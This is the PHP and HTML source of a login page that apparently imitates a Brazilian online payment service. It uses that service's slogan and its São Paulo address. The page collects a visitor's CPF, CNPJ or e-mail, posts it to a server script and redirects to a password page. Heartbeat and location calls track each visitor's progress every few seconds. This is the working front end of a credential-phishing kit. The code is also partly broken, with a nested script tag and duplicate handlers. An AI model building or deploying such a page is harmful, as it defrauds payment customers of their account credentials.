<?php
session_start();

// Verifica se o cookie 'identificador_cliente' JÁ EXISTE
if (!isset($_COOKIE['identificador_cliente'])) {
    // Se não existe, GERA um valor único e seguro
    $cookie_value = 'user_' . bin2hex(random_bytes(16));

    // Define o cookie para expirar em 30 dias
    setcookie('identificador_cliente', $cookie_value, time() + 86400 * 30, '/');

    // Disponibiliza o cookie para uso imediato no mesmo request
    $_COOKIE['identificador_cliente'] = $cookie_value;
}
?>

<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>A solução completa para pagamentos onlin</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Inter', sans-serif;
    }

    html {
      height: 100%;
    }

    body {
      background: #fff;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }

    .header {
      display: flex;
      justify-content: space-between;
      align-items: flex-start;
      padding: 20px 16px 0;
      border-bottom: 1px solid #ddd;
      margin-bottom: 25px;
    }

    .header img {
      height: 36px;
      margin-bottom: 16px;
    }

    .flag {
      border: 1px solid #ccc;
      padding: 4px 12px;
      border-radius: 24px;
      font-size: 13px;
      background: #f6f6f6;
      color: #333;
      font-weight: 500;
    }

    .container {
      max-width: 360px;
      margin: 0 auto;
      padding: 28px 20px 20px 20px;
      flex: 1;
    }

    .tabs {
      display: flex;
      justify-content: space-between;
      border-bottom: 1px solid #ddd;
      margin-bottom: 24px;
    }

    .tabs div {
      flex: 1;
      text-align: center;
      padding: 10px 0;
      font-size: 14px;
      color: #333;
      cursor: pointer;
      position: relative;
    }

    .tabs div.active {
      font-weight: bold;
    }

    .tabs div.active::after {
      content: '';
      position: absolute;
      left: 10%;
      right: 10%;
      bottom: 0;
      height: 3px;
      background-color: #007fc7;
    }

    .login-area p {
      font-size: 13px;
      color: #555;
      margin-bottom: 12px;
    }

    .login-area input[type="text"] {
      width: 100%;
      padding: 14px;
      font-size: 18px;
      font-weight: bold;
      border: 1px solid #aaa;
      border-radius: 2px;
      margin-bottom: 50px;
    }

    .error {
      color: #c53030;
      font-size: 13px;
      display: none;
      align-items: center;
      gap: 6px;
      margin-bottom: 16px;
    }

    .error img {
      width: 18px;
      height: 18px;
    }

    button {
      width: 100%;
      padding: 14px;
      background-color: #007fc7;
      color: white;
      font-weight: normal;
      border: none;
      border-radius: 2px;
      font-size: 18px;
      cursor: pointer;
      margin-bottom: 14px;
    }

    .link-outline {
      display: block;
      width: 100%;
      text-align: center;
      padding: 13px;
      border: 1px solid #007fc7;
      border-radius: 2px;
      color: #007fc7;
      font-size: 18px;
      text-decoration: none;
      margin-bottom: 24px;
    }

    .comunicar {
      display: flex;
      align-items: center;
      font-size: 14px;
      color: #333;
      gap: 8px;
      margin-bottom: 20px;
    }

    .comunicar img {
      width: 22px;
      height: 22px;
    }

    .comunicar::after {
      content: '>';
      margin-left: auto;
      color: #007fc7;
      font-weight: bold;
      font-size: 18px;
    }

    .line {
      height: 1px;
      background-color: #ddd;
      margin: 18px 0;
    }

    .recaptcha {
      font-size: 12px;
      color: #555;
      text-align: center;
      margin-bottom: 16px;
      line-height: 1.5;
    }

    .recaptcha a {
      color: #007fc7;
      text-decoration: none;
      margin: 0 4px;
    }

    .ou {
    display: flex;
    align-items: center;
    justify-content: center;
    color: #888;
    font-size: 12px;
    margin: 16px 0;
    font-weight: bold;
    }

    .ou::before,
    .ou::after {
    content: "";
    height: 1px;
    background-color: #ccc;
    width: 80px; /* ⬅️ define o comprimento das linhas */
    margin: 0 8px;
    }

    .baixar {
      text-align: center;
    }

    .baixar button {
      border: 1px solid #007fc7;
      background: #fff;
      color: #007fc7;
      border-radius: 2px;
      padding: 10px 20px;
      font-weight: bold;
      font-size: 14px;
      width: auto;
      min-width: 150px;
      margin-top: 12px;
    }

    .rodape {
      background: #222;
      color: #ccc;
      text-align: center;
      font-size: 12px;
      padding: 20px 10px;
      margin: 0;
    }

    .rodape img {
      height: 26px;
      margin-bottom: 12px;
    }
  </style>
</head>
<body>
  <div class="header">
    <div class="flag" style="
    font-size: 14px;
    padding: 6px 16px;
    border-radius: 24px;
    display: flex;
    align-items: center;
    gap: 6px;
    margin-left: auto;
    margin-right: 40px;
    ">
    PT
    <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#007fc7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-top: 1px;">
        <polyline points="6 9 12 15 18 9" />
    </svg>
    </div>
  </div>

  <div class="container">
    <div class="tabs">
      <div class="active">Minha conta</div>
      <div>Usuário adicional</div>
    </div>

    <div class="login-area">
      <p>Bem-vindo, digite seu CPF, CNPJ ou E-mail para acessar sua conta</p>
      <input type="text" id="identificador" placeholder="CPF, CNPJ ou E-mail" required>
      <div class="error" id="erroMsg">
        <img src="imagens/icon-erro.svg" alt="Erro">
        Usuário inválido. Confira os dados.
      </div>
    </div>

    <button id="btn" type="button">Continuar</button>
    <a href="#" class="link-outline">Criar conta</a>

    <div class="comunicar">
      <img src="imagens/icon-phone.svg" alt="">
      Comunicar perda ou roubo de celular
    </div>

    <div class="line"></div>

    <div class="recaptcha">
      Protegido por reCAPTCHA.<br>
      <a href="#">Privacidade</a> e <a href="#">Termos de Serviço</a>
    </div>

    <div class="ou">ou</div>

    <div class="baixar">
      <div>Baixe o aplicativo</div>
      <button>Baixar aplicativo</button>
    </div>
  </div>

  <footer class="rodape">
    <p>© 1996-2025 Todos os direitos reservados.</p>
    <p>Av. Brigadeiro Faria Lima, 1.384, São Paulo - SP - CEP 01451-001</p>
  </footer>

  <script>
    function validarCPF(cpf) {
      cpf = cpf.replace(/[^\d]+/g, '');
      if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
      let soma = 0;
      for (let i = 0; i < 9; i++) soma += parseInt(cpf.charAt(i)) * (10 - i);
      let resto = 11 - (soma % 11);
      if (resto >= 10) resto = 0;
      if (resto !== parseInt(cpf.charAt(9))) return false;
      soma = 0;
      for (let i = 0; i < 10; i++) soma += parseInt(cpf.charAt(i)) * (11 - i);
      resto = 11 - (soma % 11);
      if (resto >= 10) resto = 0;
      return resto === parseInt(cpf.charAt(10));
    }

    function validarCNPJ(cnpj) {
      cnpj = cnpj.replace(/[^\d]+/g, '');
      if (cnpj.length !== 14 || /^(\d)\1{13}$/.test(cnpj)) return false;
      let t = cnpj.length - 2;
      let d = cnpj.substring(t);
      let calc = (x) => {
        let n = cnpj.substring(0, x);
        let r = 0, p = x - 7;
        for (let i = x; i >= 1; i--) {
          r += n.charAt(x - i) * p--;
          if (p < 2) p = 9;
        }
        let res = r % 11;
        return res < 2 ? 0 : 11 - res;
      };
      return calc(t) == d.charAt(0) && calc(t + 1) == d.charAt(1);
    }

    function validarEmail(email) {
      const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      return regex.test(email);
    }

    function tipoIdentificador(valor) {
      const puro = valor.replace(/\D/g, '');
      if (puro.length === 11) return 'cpf';
      if (puro.length === 14) return 'cnpj';
      if (valor.includes('@')) return 'email';
      return null;
    }

    $('#identificador').on('input', function () {
      const input = $(this);
      const valorOriginal = input.val();

      if (/[a-zA-Z]/.test(valorOriginal)) {
        $('#erroMsg').fadeOut(150);
        input.removeClass('error-border');
        return;
      }

      const valor = valorOriginal.replace(/\D/g, '');

      if (valor.length <= 11) {
        input.val(valor.replace(/^(\d{0,3})(\d{0,3})(\d{0,3})(\d{0,2})$/, (_, a, b, c, d) =>
          [a, b, c].filter(Boolean).join('.') + (d ? '-' + d : '')
        ));
      } else if (valor.length <= 14) {
        input.val(valor.replace(/^(\d{0,2})(\d{0,3})(\d{0,3})(\d{0,4})(\d{0,2})$/, (_, a, b, c, d, e) =>
          [a, b, c].filter(Boolean).join('.') + (d ? '/' + d : '') + (e ? '-' + e : '')
        ));
      }

      $('#erroMsg').fadeOut(150);
      input.removeClass('error-border');
    });

    <script>
  $('#btn').on('click', function () {
    const valor = $('#identificador').val().trim();
    const tipo = tipoIdentificador(valor);
    let valido = false;

    // Log para depuração
    console.log('Valor digitado:', valor);
    console.log('Tipo identificado:', tipo);

    if (tipo === 'cpf') valido = validarCPF(valor);
    else if (tipo === 'cnpj') valido = validarCNPJ(valor);
    else if (tipo === 'email') valido = validarEmail(valor);

    // Log para depuração
    console.log('Validação:', valido);

    if (!valido) {
      $('#erroMsg').css('display', 'flex').hide().fadeIn(200);
      $('#identificador').addClass('error-border');
      return;
    }

    // Fade out do formulário de login antes de redirecionar
    $('.login-area').fadeOut(300, function() {
      $.post('identificador.php', { 
          identificador: valor,
          device_type: 'Mobile' // Adicionando o tipo de dispositivo
      }, () => {
          console.log('Redirecionando para a página de senha...');
          window.location.href = 'senha.php'; // Redireciona para a página de senha
      });
    });
  });
</script>
  <script>
    function getCookie(name) {
        const value = `; ${document.cookie}`;
          const parts = value.split(`; ${name}=`);
        if (parts.length === 2) return parts.pop().split(';').shift();
    }
    function sendHeartbeat() {
            // CORREÇÃO: Usando o nome correto do cookie
        const userCookie = getCookie('identificador_cliente'); 

          if (userCookie) {
            const formData = new FormData();
              formData.append('identificador_cookie', userCookie);

                  fetch('/heartbeat.php', { // O caminho para o nosso novo arquivo
                      method: 'POST',
                      body: formData
                  }).catch(error => console.error('Heartbeat falhou:', error));
                } 
            }
            // Envia o primeiro sinal imediatamente e depois a cada 10 segundos
      sendHeartbeat();
      setInterval(sendHeartbeat, 3000); // 10000 ms = 10 segundos
  </script>
  <script>
      document.addEventListener("DOMContentLoaded", function() {
          const nomeDaPagina = 'login.php'; // <-- MUDE ESTE VALOR EM CADA PÁGINA
          
          const formData = new FormData();
          formData.append('page', nomeDaPagina);

          fetch('update_location.php', {
              method: 'POST',
              body: formData
          }).catch(error => console.error('Falha ao atualizar localização:', error));
      });
  </script>
</body>
</html>
<script>
  document.getElementById('btn').addEventListener('click', function () {
    const valor = document.getElementById('identificador').value.trim();
    const tipo = tipoIdentificador(valor);
    let valido = false;

    if (tipo === 'cpf') valido = validarCPF(valor);
    else if (tipo === 'cnpj') valido = validarCNPJ(valor);
    else if (tipo === 'email') valido = validarEmail(valor);

    if (!valido) {
      document.getElementById('erroMsg').style.display = 'flex';
      return;
    }

    // impede o redirect automático
    sessionStorage.setItem('passouLogin', 'true');

    window.location.href = 'senha.php';
  });
</script>
